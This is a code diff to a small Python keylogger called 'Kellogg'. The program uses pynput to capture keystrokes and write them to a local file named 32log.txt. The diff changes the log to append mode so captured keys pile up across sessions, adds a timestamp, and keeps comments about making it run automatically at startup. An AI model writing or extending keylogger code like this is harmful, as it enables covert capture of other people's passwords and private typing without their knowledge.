@@ -1,7 +1,10 @@
-print("Kellogg Start")
+print("Kellogg Boot")
 from pynput.keyboard import Key, Listener
+import os.path
+import datetime
+now = datetime.datetime.now()
 
-
+print (str(now))
 
 count = 0
 keys = []
@@ -19,7 +22,7 @@ def on_press(key):
 
 def write_file(keys):
     
-    with open("32log.txt", "w") as f:
+    with open("32log.txt", "a") as f:
         for key in keys:
             k = str(key).replace("'","")
             if k.find("space") > 0:
@@ -28,11 +31,12 @@ def write_file(keys):
                 f.write(k)
             elif k.find("enter") >0:
                 f.write("Screenshot")
+          
             
 def on_release(key):     
     if key == Key.esc:
         return False
-    #if we want I can make this save the txt file then run an inf. loop
+    #if we want we could try to make this save the txt file then run an inf. loop
     #then make it always begin start on run
 print("New Session Started")
 print("UPDATE:")
